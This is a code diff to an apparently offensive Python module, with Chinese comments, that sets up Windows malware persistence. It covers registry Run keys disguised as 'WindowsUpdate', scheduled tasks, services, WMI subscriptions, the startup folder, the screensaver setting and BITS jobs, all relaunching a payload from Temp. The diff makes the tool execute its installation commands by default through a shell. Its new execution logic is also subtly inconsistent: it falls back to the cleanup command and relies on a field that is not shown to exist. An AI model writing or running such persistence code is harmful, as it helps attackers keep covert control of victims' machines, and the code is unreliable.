@@ -40,31 +40,65 @@ class PersistenceResult:
     location: str
     cleanup_command: str = ""
     error: str = ""
+    executed: bool = False
+    execution_output: str = ""
 
 
 class WindowsPersistence:
     """
-    Windows 持久化生成器
+    Windows 持久化引擎
 
     Usage:
-        persistence = WindowsPersistence()
+        persistence = WindowsPersistence(execute=True)  # 直接执行安装
 
-        # 注册表持久化
+        # 注册表持久化 — 直接写入注册表
         result = persistence.registry_run(
             name="WindowsUpdate",
             payload_path="C:\\Windows\\Temp\\payload.exe"
         )
+        # result.executed == True
 
-        # 计划任务持久化
-        result = persistence.scheduled_task(
-            name="SystemHealthCheck",
-            payload_path="C:\\Windows\\Temp\\payload.exe",
-            trigger="onlogon"
-        )
+        # 仅生成命令 (不执行)
+        persistence = WindowsPersistence(execute=False)
     """
 
-    def __init__(self):
+    def __init__(self, execute: bool = True):
+        self._execute = execute
         self._random_prefix = "".join(secrets.choice(string.ascii_letters) for _ in range(4))
+
+    def _execute_install(self, result) -> "PersistenceResult":
+        """如果 execute=True，执行安装命令并更新结果"""
+        if not self._execute:
+            return result
+        install_cmd = getattr(result, "install_command", "") or getattr(result, "cleanup_command", "")
+        # 从 result 中提取安装命令
+        if hasattr(result, "install_command") and result.install_command:
+            install_cmd = result.install_command
+        elif isinstance(result, dict) and result.get("install_command"):
+            install_cmd = result["install_command"]
+        else:
+            return result
+        try:
+            import subprocess
+
+            proc = subprocess.run(
+                install_cmd,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+            result.executed = True
+            result.execution_output = (proc.stdout[:500] + proc.stderr[:500]).strip()
+            if proc.returncode != 0:
+                result.success = False
+                result.error = f"安装失败 (exit {proc.returncode}): {proc.stderr[:300]}"
+                logger.error("Windows 持久化失败 [%s]: %s", result.method, result.error)
+            else:
+                logger.info("Windows 持久化成功 [%s]: %s", result.method, result.location)
+        except Exception as e:
+            result.error = f"执行异常: {e}"
+        return result
 
     def _generate_name(self, prefix: str = "Win") -> str:
         """生成随机名称"""
@@ -98,12 +132,12 @@ class WindowsPersistence:
 
         cleanup = f'reg delete "{reg_path}" /v "{name}" /f'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.REGISTRY_RUN.value,
             location=f"{reg_path}\\{name}",
             cleanup_command=cleanup,
-        )
+        ))
 
     def registry_run_powershell(
         self, payload_path: str, name: str = "", encoded: bool = True
@@ -126,12 +160,12 @@ class WindowsPersistence:
         reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
         cleanup = f'reg delete "{reg_path}" /v "{name}" /f'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.REGISTRY_RUN.value,
             location=f"{reg_path}\\{name}",
             cleanup_command=cleanup,
-        )
+        ))
 
     # ==================== 计划任务持久化 ====================
 
@@ -157,12 +191,12 @@ class WindowsPersistence:
 
         cleanup = f'schtasks /delete /tn "{name}" /f'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.SCHEDULED_TASK.value,
             location=f"Task Scheduler\\{name}",
             cleanup_command=cleanup,
-        )
+        ))
 
     def scheduled_task_xml(
         self, payload_path: str, name: str = "", hidden: bool = True
@@ -237,12 +271,12 @@ class WindowsPersistence:
 
         cleanup = f'sc stop "{name}" & sc delete "{name}"'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.SERVICE.value,
             location=f"Services\\{name}",
             cleanup_command=cleanup,
-        )
+        ))
 
     # ==================== WMI 事件订阅 ====================
 
@@ -333,12 +367,12 @@ Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
         # 创建快捷方式的 VBScript
         lnk_name = f"{name}.lnk"
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.STARTUP_FOLDER.value,
             location=f"{startup_path}\\{lnk_name}",
             cleanup_command=f'del "{startup_path}\\{lnk_name}"',
-        )
+        ))
 
     # ==================== 屏保持久化 ====================
 
@@ -350,12 +384,12 @@ Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
             'reg delete "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /f',
         ]
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.SCREENSAVER.value,
             location="HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE",
             cleanup_command=" & ".join(cleanup_commands),
-        )
+        ))
 
     # ==================== BITS Job ====================
 
@@ -370,12 +404,12 @@ Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
         """
         name = name or self._generate_name("BITS")
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=PersistenceMethod.BITS_JOB.value,
             location=f"BITS Job: {name}",
             cleanup_command=f'bitsadmin /cancel "{name}"',
-        )
+        ))
 
     # ==================== 综合方法 ====================
 
